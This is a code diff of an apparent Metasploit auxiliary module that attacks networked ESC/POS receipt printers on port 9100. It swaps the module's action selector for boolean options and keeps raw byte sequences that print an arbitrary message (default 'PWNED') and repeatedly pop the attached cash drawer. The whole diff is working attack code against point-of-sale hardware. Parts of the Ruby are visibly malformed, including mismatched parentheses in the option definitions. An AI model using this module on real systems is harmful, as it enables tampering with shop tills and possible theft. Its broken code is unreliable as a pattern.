@@ -18,46 +18,42 @@ class MetasploitModule < Msf::Auxiliary
       'References'  => [
         ['URL', 'https://github.com/futileskills/Security-Advisory']
       ],
-      'Actions'     =>
-        [
-          ['PRINT', { 'Description' => 'Print a message to the printer' }],
-          ['DRAWER', { 'Description' => 'Trigger the attached cash drawer' }],
-          ['BOTH', { 'Description' => 'Print and trigger the drawer' }]
-        ],
-      'DefaultAction' => 'PRINT'
+      
     ))
 
     register_options(
-      [
-        Opt::RPORT(9100),                                  # Default printer port
-        OptString.new('MESSAGE', [true, 'Message to print', 'PWNED']), conditions: %w[ACTION != DRAWER]),
-        OptBool.new('TRIGGER_DRAWER', [false, 'Trigger the attached cash drawer', false]),
-        OptInt.new('DRAWER_COUNT', [true, 'Number of times to trigger the drawer', 2])
-      ]
-    )
+          [
+            Opt::RPORT(9100),                                  # Default printer port
+            OptString.new('MESSAGE', [true, 'Message to print', 'PWNED']), conditions: %w[PRINT_MESSAGE]),
+            OptBool.new('TRIGGER_DRAWER', [false, 'Trigger the attached cash drawer', false]),
+            OptBool.new('PRINT_MESSAGE', [false, 'Print the specified message', false]),
+            OptInt.new('DRAWER_COUNT', [true, 'Number of times to trigger the drawer', 2])
+          ]
+        )
   end
 
   # ESC/POS command to trigger the cash drawer
   DRAWER_COMMAND = "\x1b\x70\x00\x19\x32".freeze
 
   def run
-    rhost_ip = rhost
-    message = datastore['MESSAGE']
-    trigger_drawer = datastore['TRIGGER_DRAWER']
-    drawer_count = datastore['DRAWER_COUNT'].to_i.clamp(1, 10)  # Clamp for safety
+      rhost_ip = rhost
+      message = datastore['MESSAGE']
+      trigger_drawer = datastore['TRIGGER_DRAWER']
+      print_message = datastore['PRINT_MESSAGE']
+      drawer_count = datastore['DRAWER_COUNT'].to_i.clamp(1, 10)  # Clamp for safety
 
-    case action.name
-    when 'PRINT'
-      send_print(rhost_ip, message)
-    when 'DRAWER'
-      send_drawer(rhost_ip, drawer_count)
-    when 'BOTH'
-      send_print(rhost_ip, message)
-      send_drawer(rhost_ip, drawer_count)
-    else
-      print_error("Unknown action: #{action.name}")
+      if print_message
+        send_print(rhost_ip, message)
+      end
+
+      if trigger_drawer
+        send_drawer(rhost_ip, drawer_count)
+      end
+
+      unless print_message || trigger_drawer
+        print_error('No action specified. Please set either TRIGGER_DRAWER or PRINT_MESSAGE to true.')
+      end
     end
-  end
 
   def send_print(rhost_ip, message)
     print_commands = "\x1b\x40\x1b\x61\x01\x1d\x21\x11#{message}\x1d\x21\x00\n\x1b\x61\x00\n\n\x1d\x56\x42"
